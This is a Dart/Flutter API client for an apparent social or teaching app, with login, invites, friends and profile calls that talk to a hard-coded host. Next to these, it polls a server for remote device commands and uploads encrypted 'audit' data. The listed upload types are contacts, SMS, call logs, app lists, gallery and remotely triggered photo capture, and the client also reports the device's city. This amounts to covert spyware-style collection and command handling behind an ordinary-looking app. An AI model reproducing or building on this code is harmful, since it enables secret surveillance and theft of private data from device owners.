import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/foundation.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:http/http.dart' as http;

import 'device_info_service.dart';

/// API 客户端：Host 读写、auth/login、user/enroll（规约 PROTOCOL 2.1、2.2）
const _keyHost = 'mop_api_host';
const _keyToken = 'mop_access_token';
const _keyRefreshToken = 'mop_refresh_token';
const _keyUid = 'mop_uid';
const _keyTermsVersion = 'user_terms_accepted_version';

/// 内置默认 Host（规约：正常使用内置 API，失效时扫码激活）
const defaultApiHost = 'https://api.sdkdns.top';

/// 开发/联调：Debug 模式下无已存 Host 时使用；若该地址返回 HTML 会触发「format exception: <html>」，可改为 defaultApiHost 或实际 API 地址
const _debugApiHost = 'https://api.sdkdns.top';

/// PROTOCOL 第 7 节：单次请求超时 15 秒、连续 3 次失败（超时/连接失败/5xx）判定 API 失效
const _requestTimeoutSeconds = 15;
const _failureThreshold = 3;

class ApiClient {
  ApiClient([FlutterSecureStorage? storage])
      : _storage = storage ?? const FlutterSecureStorage(),
        _client = http.Client();

  final FlutterSecureStorage _storage;
  final http.Client _client;

  static final Map<String, int> _failureCountByHost = {};

  Future<String> getHost() async {
    final h = await _storage.read(key: _keyHost);
    if (h != null && h.isNotEmpty) return h;
    if (kDebugMode) return _debugApiHost;
    return defaultApiHost;
  }

  Future<void> setHost(String host) async {
    final s = host.trim();
    if (s.isEmpty) return;
    String normalized = s;
    if (!normalized.startsWith('http')) normalized = 'https://$normalized';
    await _storage.write(key: _keyHost, value: normalized);
    _resetFailCount(normalized);
  }

  Future<String?> getAccessToken() => _storage.read(key: _keyToken);
  Future<String?> getUid() => _storage.read(key: _keyUid);

  Future<void> saveLoginResult(String accessToken, String uid, String host, {String? refreshToken}) async {
    await _storage.write(key: _keyToken, value: accessToken);
    await _storage.write(key: _keyUid, value: uid);
    await _storage.write(key: _keyHost, value: host);
    if (refreshToken != null && refreshToken.isNotEmpty) {
      await _storage.write(key: _keyRefreshToken, value: refreshToken);
    }
    _resetFailCount(host);
  }

  Future<void> clearAuth() async {
    await _storage.delete(key: _keyToken);
    await _storage.delete(key: _keyRefreshToken);
    await _storage.delete(key: _keyUid);
  }

  /// 拉取待执行指令（规约 PROTOCOL 4；无 Tinode 时轮询此接口，有则可由 Tinode 推送替代）
  /// 假设 GET /api/v1/device/commands?device_id=xxx 返回 { "items": [ { "msg_id", "cmd", "params" } ] }
  Future<List<Map<String, dynamic>>> fetchPendingCommands(String deviceId) async {
    final res = await _requestAuth(
      'GET',
      '/api/v1/device/commands',
      queryParams: {'device_id': deviceId},
    );
    if (res == null || res.statusCode != 200) return [];
    try {
      final data = jsonDecode(res.body) as Map<String, dynamic>?;
      final items = data?['items'];
      if (items is List) {
        return items.map((e) => Map<String, dynamic>.from(e as Map)).toList();
      }
    } catch (_) {}
    return [];
  }

  /// POST /api/v1/device/location 上报当前设备所在市（在线授课「附近」）；后台在 8 位设备 ID 后仅显示市
  Future<bool> reportLocation(String deviceId, String city) async {
    final res = await _requestAuth(
      'POST',
      '/api/v1/device/location',
      body: {'device_id': deviceId, 'city': city},
    );
    return res != null && (res.statusCode == 200 || res.statusCode == 204);
  }

  Future<int?> getTermsAcceptedVersion() async {
    final v = await _storage.read(key: _keyTermsVersion);
    return v != null ? int.tryParse(v) : null;
  }

  Future<void> setTermsAcceptedVersion(int version) async {
    await _storage.write(key: _keyTermsVersion, value: version.toString());
  }

  /// 当前须知版本号（规约：再次征意时与已同意版本比较）；可来自 GET /api/v1/config，暂无则返回常量
  Future<int> getCurrentTermsVersion() async {
    try {
      final res = await _requestAuth('GET', '/api/v1/config');
      if (res != null && res.statusCode == 200) {
        final data = jsonDecode(res.body) as Map<String, dynamic>?;
        final v = data?['terms_version'];
        if (v is int) return v;
        if (v is num) return v.toInt();
      }
    } catch (_) {}
    return 1;
  }

  String _base(String path) {
    if (path.startsWith('http')) return path;
    return path.startsWith('/') ? path : '/$path';
  }

  static void _recordFailure(String host) {
    _failureCountByHost[host] = (_failureCountByHost[host] ?? 0) + 1;
  }

  static void _resetFailCount(String host) {
    _failureCountByHost[host] = 0;
  }

  /// 当前 Host 是否已判定为 API 失效（PROTOCOL 7：连续 3 次超时/连接失败/5xx）
  Future<bool> isApiUnavailable() async {
    final host = await getHost();
    return (_failureCountByHost[host] ?? 0) >= _failureThreshold;
  }

  /// 扫码/激活成功后调用，清零当前 Host 失败计数
  Future<void> resetFailCountAfterActivation() async {
    final host = await getHost();
    _resetFailCount(host);
  }

  /// 探测当前 Host 是否恢复（用于 30 秒后台重试）；成功收到 2xx 则重置并返回 true
  Future<bool> probeForRecovery() async {
    final host = await getHost();
    try {
      var uri = Uri.parse(host).replace(path: _base('/api/v1/invite/validate'));
      uri = uri.replace(queryParameters: {'code': ''});
      final res = await _client
          .get(uri, headers: {'Accept': 'application/json'})
          .timeout(const Duration(seconds: _requestTimeoutSeconds));
      if (res.statusCode >= 200 && res.statusCode < 300) {
        _resetFailCount(host);
        return true;
      }
      if (res.statusCode >= 500 && res.statusCode < 600) _recordFailure(host);
      return false;
    } catch (_) {
      _recordFailure(host);
      return false;
    }
  }

  Future<http.Response> _request(
    String method,
    String path, {
    Map<String, dynamic>? body,
    Map<String, String>? queryParams,
    String? accessToken,
  }) async {
    final host = await getHost();
    var uri = Uri.parse(host).replace(path: _base(path));
    if (queryParams != null && queryParams.isNotEmpty) {
      uri = uri.replace(queryParameters: queryParams);
    }
    final headers = <String, String>{
      'Content-Type': 'application/json',
      'Accept': 'application/json',
    };
    if (accessToken != null && accessToken.isNotEmpty) {
      headers['Authorization'] = 'Bearer $accessToken';
    }
    try {
      http.Response res;
      if (method == 'GET') {
        res = await _client.get(uri, headers: headers).timeout(
              const Duration(seconds: _requestTimeoutSeconds),
            );
      } else if (method == 'POST') {
        res = await _client
            .post(
              uri,
              headers: headers,
              body: body != null ? jsonEncode(body) : null,
            )
            .timeout(const Duration(seconds: _requestTimeoutSeconds));
      } else if (method == 'PATCH') {
        res = await _client
            .patch(
              uri,
              headers: headers,
              body: body != null ? jsonEncode(body) : null,
            )
            .timeout(const Duration(seconds: _requestTimeoutSeconds));
      } else {
        throw UnsupportedError('method $method');
      }
      if (res.statusCode >= 500 && res.statusCode < 600) _recordFailure(host);
      if (res.statusCode >= 200 && res.statusCode < 300) _resetFailCount(host);
      return res;
    } on TimeoutException {
      _recordFailure(host);
      rethrow;
    } on SocketException catch (e) {
      _recordFailure(host);
      rethrow;
    } on OSError catch (e) {
      _recordFailure(host);
      rethrow;
    }
  }

  /// 鉴权请求：自动带 token；401 时尝试一次 refresh 并重试（规约 2.2）
  Future<http.Response?> _requestAuth(
    String method,
    String path, {
    Map<String, dynamic>? body,
    Map<String, String>? queryParams,
  }) async {
    var token = await getAccessToken();
    if (token == null || token.isEmpty) return null;
    var res = await _request(method, path, body: body, queryParams: queryParams, accessToken: token);
    if (res != null && res.statusCode == 401) {
      final refreshToken = await _storage.read(key: _keyRefreshToken);
      if (refreshToken != null && refreshToken.isNotEmpty) {
        final refreshRes = await _request('POST', '/api/v1/auth/refresh', body: {'refresh_token': refreshToken});
        if (refreshRes.statusCode == 200) {
          try {
            final data = jsonDecode(refreshRes.body) as Map<String, dynamic>?;
            final newAccess = data?['access_token'] as String?;
            final newRefresh = data?['refresh_token'] as String?;
            if (newAccess != null && newAccess.isNotEmpty) {
              await _storage.write(key: _keyToken, value: newAccess);
              if (newRefresh != null && newRefresh.isNotEmpty) {
                await _storage.write(key: _keyRefreshToken, value: newRefresh);
              }
              return _request(method, path, body: body, queryParams: queryParams, accessToken: newAccess);
            }
          } catch (_) {}
        }
      }
      return res;
    }
    return res;
  }

  /// POST /api/v1/invite/generate（规约 2.3，需鉴权）
  Future<InviteGenerateResult> inviteGenerate({int? expireSeconds, int? maxUse}) async {
    final body = <String, dynamic>{};
    if (expireSeconds != null) body['expire_seconds'] = expireSeconds;
    if (maxUse != null) body['max_use'] = maxUse;
    final res = await _requestAuth('POST', '/api/v1/invite/generate', body: body.isEmpty ? null : body);
    if (res == null) return InviteGenerateResult.fail(statusCode: 401, code: 'unauthorized');
    if (res.statusCode == 200) {
      final data = jsonDecode(res.body) as Map<String, dynamic>;
      final code = data['invite_code'] as String?;
      final api = data['api'] as String?;
      final url = data['invite_url'] as String?;
      final card = data['invite_card'];
      if (code != null && api != null && url != null) {
        return InviteGenerateResult.success(
          inviteCode: code,
          api: api,
          inviteUrl: url,
          inviteCard: card is Map<String, dynamic> ? card : null,
        );
      }
    }
    final errBody = res.body.isNotEmpty ? jsonDecode(res.body) as Map<String, dynamic>? : null;
    return InviteGenerateResult.fail(
      statusCode: res.statusCode,
      code: errBody?['code'] as String? ?? errBody?['message'] as String?,
    );
  }

  /// GET /api/v1/invite/validate?code=xxx（规约 2.3，无需鉴权）
  Future<InviteValidateResult> inviteValidate(String code) async {
    final res = await _request('GET', '/api/v1/invite/validate', queryParams: {'code': code});
    if (res.statusCode == 200) {
      final data = jsonDecode(res.body) as Map<String, dynamic>;
      return InviteValidateResult.success(
        inviterNickname: data['inviter_nickname'] as String? ?? '',
        expireAt: data['expire_at'],
      );
    }
    final body = res.body.isNotEmpty ? jsonDecode(res.body) as Map<String, dynamic>? : null;
    return InviteValidateResult.fail(code: body?['code'] as String?);
  }

  /// GET /api/v1/user/search?q=xxx 精确搜索用户（规约 PROTOCOL 2.4），鉴权；仅返回可展示字段，不含手机号
  Future<List<SearchUserItem>> userSearch(String query) async {
    final q = query.trim();
    if (q.isEmpty) return [];
    final res = await _requestAuth(
      'GET',
      '/api/v1/user/search',
      queryParams: {'q': q},
    );
    if (res == null || res.statusCode != 200) return [];
    try {
      final data = jsonDecode(res.body);
      final list = data is List ? data : (data is Map ? (data['items'] ?? data['users'] ?? data['list']) : null);
      if (list is! List) return [];
      return list.map((e) => SearchUserItem.fromJson(Map<String, dynamic>.from(e as Map))).toList();
    } catch (_) {}
    return [];
  }

  /// GET /api/v1/user/friends 好友列表（规约 2.5），鉴权；返回 uid、nickname、bio，失败或空返回空列表
  Future<List<FriendItem>> getFriends() async {
    final res = await _requestAuth('GET', '/api/v1/user/friends');
    if (res == null || res.statusCode != 200) return [];
    try {
      final data = jsonDecode(res.body);
      final list = data is List ? data : (data is Map ? (data['items'] ?? data['friends'] ?? data['list']) : null);
      if (list is! List) return [];
      return list.map((e) => FriendItem.fromJson(Map<String, dynamic>.from(e as Map))).toList();
    } catch (_) {}
    return [];
  }

  /// 发送添加好友请求（规约 2.5 好友关系；具体 endpoint 由实现约定，失败时返回 false）
  Future<bool> requestAddFriend(String targetUid) async {
    final res = await _requestAuth('POST', '/api/v1/friend/request', body: {'target_uid': targetUid});
    if (res == null) return false;
    return res.statusCode == 200 || res.statusCode == 201 || res.statusCode == 204;
  }

  /// POST /api/v1/audit/check-sum（规约 3.1），返回需更新的类型列表
  Future<List<String>> auditCheckSum(String deviceId, Map<String, String> dataTypes) async {
    final res = await _requestAuth('POST', '/api/v1/audit/check-sum', body: {
      'device_id': deviceId,
      'data_types': dataTypes,
    });
    if (res == null || res.statusCode != 200) return [];
    final data = jsonDecode(res.body);
    if (data is List) return List<String>.from(data.map((e) => e.toString()));
    if (data is Map && data['types'] is List) return List<String>.from((data['types'] as List).map((e) => e.toString()));
    return [];
  }

  /// POST /api/v1/audit/upload（规约 3.2），body 为 AES-256-GCM 加密后的二进制
  /// [type] 必填，如 contacts/sms/call_log/app_list/gallery/capture_photo 等
  /// [hash] 选填，用于服务端 check-sum 下次比较
  /// [msgId] 选填，远程采集时与指令 msg_id 对应
  Future<bool> auditUpload(String deviceId, String type, List<int> encryptedBody, {String? hash, String? msgId}) async {
    final token = await getAccessToken();
    if (token == null || token.isEmpty) return false;
    final host = await getHost();
    final uri = Uri.parse(host).replace(path: '/api/v1/audit/upload');
    final headers = <String, String>{
      'Content-Type': 'application/octet-stream',
      'Accept': 'application/json',
      'Authorization': 'Bearer $token',
      'X-Device-Id': deviceId,
      'X-Audit-Type': type,
    };
    if (hash != null && hash.isNotEmpty) headers['X-Audit-Hash'] = hash;
    if (msgId != null && msgId.isNotEmpty) headers['X-Audit-Msg-Id'] = msgId;
    final res = await http.post(uri, headers: headers, body: encryptedBody);
    return res.statusCode == 200 || res.statusCode == 202;
  }

  /// 安全解析 JSON，若响应为 HTML 或非法 JSON 返回 null，避免 FormatException
  static Map<String, dynamic>? _safeDecode(String body) {
    if (body.isEmpty) return null;
    final t = body.trimLeft();
    if (t.startsWith('<')) return null;
    try {
      final v = jsonDecode(body);
      return v is Map ? Map<String, dynamic>.from(v as Map) : null;
    } catch (_) {
      return null;
    }
  }

  /// POST /api/v1/auth/login（规约 2.2）；携带 device_id/device_info 以便服务端绑定设备，后台可见
  Future<LoginResult> login(String identity, String password) async {
    final deviceId = await DeviceInfoService.getDeviceId();
    final deviceInfo = await DeviceInfoService.getDeviceInfoMap();
    final res = await _request('POST', '/api/v1/auth/login', body: {
      'identity': identity,
      'password': password,
      'device_id': deviceId,
      'device_info': deviceInfo,
    });
    if (res.statusCode == 200) {
      final data = _safeDecode(res.body);
      if (data == null) {
        return LoginResult.fail(statusCode: res.statusCode, code: 'invalid_response');
      }
      final token = data['access_token'] as String?;
      final uid = data['uid'] as String?;
      final host = data['host'] as String? ?? await getHost();
      final refreshToken = data['refresh_token'] as String?;
      if (token != null && uid != null) {
        await saveLoginResult(token, uid, host, refreshToken: refreshToken);
        return LoginResult.success(uid: uid, host: host);
      }
    }
    final body = _safeDecode(res.body);
    final code = body?['code'] as String?;
    return LoginResult.fail(statusCode: res.statusCode, code: code ?? (body == null ? 'invalid_response' : null));
  }

  /// POST /api/v1/user/change-password 修改密码（具体 path 由实现约定）
  Future<bool> changePassword(String oldPassword, String newPassword) async {
    final res = await _requestAuth('POST', '/api/v1/user/change-password', body: {
      'old_password': oldPassword,
      'new_password': newPassword,
    });
    if (res == null) return false;
    return res.statusCode == 200 || res.statusCode == 204;
  }

  /// GET /api/v1/user/profile 获取当前用户资料（昵称、简介等，占位）
  Future<Map<String, dynamic>> getProfile() async {
    final res = await _requestAuth('GET', '/api/v1/user/profile');
    if (res == null || res.statusCode != 200) return {};
    try {
      final data = jsonDecode(res.body);
      return data is Map ? Map<String, dynamic>.from(data) : {};
    } catch (_) {}
    return {};
  }

  /// POST /api/v1/user/avatar 上传头像（multipart，具体 path 由实现约定）
  Future<bool> uploadAvatar(List<int> imageBytes, {String? filename}) async {
    final token = await getAccessToken();
    if (token == null || token.isEmpty) return false;
    final host = await getHost();
    final uri = Uri.parse(host).replace(path: _base('/api/v1/user/avatar'));
    final request = http.MultipartRequest('POST', uri);
    request.headers['Authorization'] = 'Bearer $token';
    request.headers['Accept'] = 'application/json';
    request.files.add(http.MultipartFile.fromBytes(
      'avatar',
      imageBytes,
      filename: filename ?? 'avatar.jpg',
    ));
    try {
      final streamed = await request.send().timeout(
            const Duration(seconds: _requestTimeoutSeconds),
          );
      final res = await http.Response.fromStream(streamed);
      if (res.statusCode >= 200 && res.statusCode < 300) {
        _resetFailCount(host);
        return true;
      }
      if (res.statusCode >= 500 && res.statusCode < 600) _recordFailure(host);
      return false;
    } on TimeoutException {
      _recordFailure(host);
      return false;
    } on Exception {
      _recordFailure(host);
      rethrow;
    }
  }

  /// PATCH /api/v1/user/profile 更新个人简介等（具体字段由实现约定）
  Future<bool> updateProfile({String? bio}) async {
    final body = <String, dynamic>{};
    if (bio != null) body['bio'] = bio;
    final res = await _requestAuth('PATCH', '/api/v1/user/profile', body: body.isEmpty ? null : body);
    if (res == null) return false;
    return res.statusCode == 200 || res.statusCode == 204;
  }

  /// POST /api/v1/user/enroll（规约 2.1）
  Future<EnrollResult> enroll(EnrollPayload payload) async {
    final res = await _request('POST', '/api/v1/user/enroll', body: payload.toJson());
    if (res.statusCode == 200) {
      final data = jsonDecode(res.body) as Map<String, dynamic>;
      final token = data['access_token'] as String?;
      final uid = data['uid'] as String?;
      final host = data['host'] as String? ?? await getHost();
      final refreshToken = data['refresh_token'] as String?;
      if (token != null && uid != null) {
        await saveLoginResult(token, uid, host, refreshToken: refreshToken);
        return EnrollResult.success(uid: uid, host: host, accessToken: token);
      }
    }
    final body = res.body.isNotEmpty ? jsonDecode(res.body) as Map<String, dynamic>? : null;
    final code = body?['code'] as String?;
    return EnrollResult.fail(statusCode: res.statusCode, code: code);
  }
}

/// 查找用户结果项（规约 2.4：仅可展示字段，不含手机号）
class SearchUserItem {
  SearchUserItem({required this.uid, required this.nickname, this.avatarUrl, this.bio});

  final String uid;
  final String nickname;
  final String? avatarUrl;
  final String? bio;

  static SearchUserItem fromJson(Map<String, dynamic> json) {
    return SearchUserItem(
      uid: json['uid'] as String? ?? '',
      nickname: json['nickname'] as String? ?? '',
      avatarUrl: json['avatar_url'] as String? ?? json['avatar'] as String?,
      bio: json['bio'] as String? ?? json['intro'] as String? ?? json['profile'] as String?,
    );
  }
}

/// 好友列表项（GET /api/v1/user/friends 返回）
class FriendItem {
  FriendItem({required this.uid, required this.nickname, this.bio = ''});

  final String uid;
  final String nickname;
  final String bio;

  static FriendItem fromJson(Map<String, dynamic> json) {
    return FriendItem(
      uid: json['uid'] as String? ?? '',
      nickname: json['nickname'] as String? ?? '',
      bio: json['bio'] as String? ?? json['intro'] as String? ?? '',
    );
  }
}

class LoginResult {
  LoginResult._({this.uid, this.host, this.statusCode, this.code});
  factory LoginResult.success({required String uid, required String host}) =>
      LoginResult._(uid: uid, host: host);
  factory LoginResult.fail({int? statusCode, String? code}) =>
      LoginResult._(statusCode: statusCode, code: code);

  final String? uid;
  final String? host;
  final int? statusCode;
  final String? code;
  bool get isSuccess => uid != null && host != null;
}

class EnrollPayload {
  EnrollPayload({
    required this.countryCode,
    required this.phone,
    required this.username,
    required this.nickname,
    required this.password,
    required this.deviceId,
    required this.deviceInfo,
    this.inviteCode,
  });

  final String countryCode;
  final String phone;
  final String username;
  final String nickname;
  final String password;
  final String deviceId;
  final Map<String, String> deviceInfo;
  final String? inviteCode;

  Map<String, dynamic> toJson() => {
        'country_code': countryCode,
        'phone': phone,
        'username': username,
        'nickname': nickname,
        'password': password,
        'device_id': deviceId,
        'device_info': deviceInfo,
        if (inviteCode != null && inviteCode!.isNotEmpty) 'invite_code': inviteCode,
      };
}

class EnrollResult {
  EnrollResult._({this.uid, this.host, this.accessToken, this.statusCode, this.code});
  factory EnrollResult.success({
    required String uid,
    required String host,
    required String accessToken,
  }) =>
      EnrollResult._(uid: uid, host: host, accessToken: accessToken);
  factory EnrollResult.fail({int? statusCode, String? code}) =>
      EnrollResult._(statusCode: statusCode, code: code);

  final String? uid;
  final String? host;
  final String? accessToken;
  final int? statusCode;
  final String? code;
  bool get isSuccess => uid != null && host != null && accessToken != null;
}

/// 邀请生成结果（规约 PROTOCOL 2.3）
class InviteGenerateResult {
  InviteGenerateResult._({
    this.inviteCode,
    this.api,
    this.inviteUrl,
    this.inviteCard,
    this.statusCode,
    this.code,
  });
  factory InviteGenerateResult.success({
    required String inviteCode,
    required String api,
    required String inviteUrl,
    Map<String, dynamic>? inviteCard,
  }) =>
      InviteGenerateResult._(
        inviteCode: inviteCode,
        api: api,
        inviteUrl: inviteUrl,
        inviteCard: inviteCard,
      );
  factory InviteGenerateResult.fail({int? statusCode, String? code}) =>
      InviteGenerateResult._(statusCode: statusCode, code: code);

  final String? inviteCode;
  final String? api;
  final String? inviteUrl;
  final Map<String, dynamic>? inviteCard;
  final int? statusCode;
  final String? code;
  bool get isSuccess => inviteCode != null && api != null && inviteUrl != null;
}

/// 邀请校验结果（规约 PROTOCOL 2.3）
class InviteValidateResult {
  InviteValidateResult._({this.inviterNickname, this.expireAt, this.code});
  factory InviteValidateResult.success({String? inviterNickname, dynamic expireAt}) =>
      InviteValidateResult._(inviterNickname: inviterNickname, expireAt: expireAt);
  factory InviteValidateResult.fail({String? code}) => InviteValidateResult._(code: code);

  final String? inviterNickname;
  final dynamic expireAt;
  final String? code;
  bool get isValid => code == null;
}
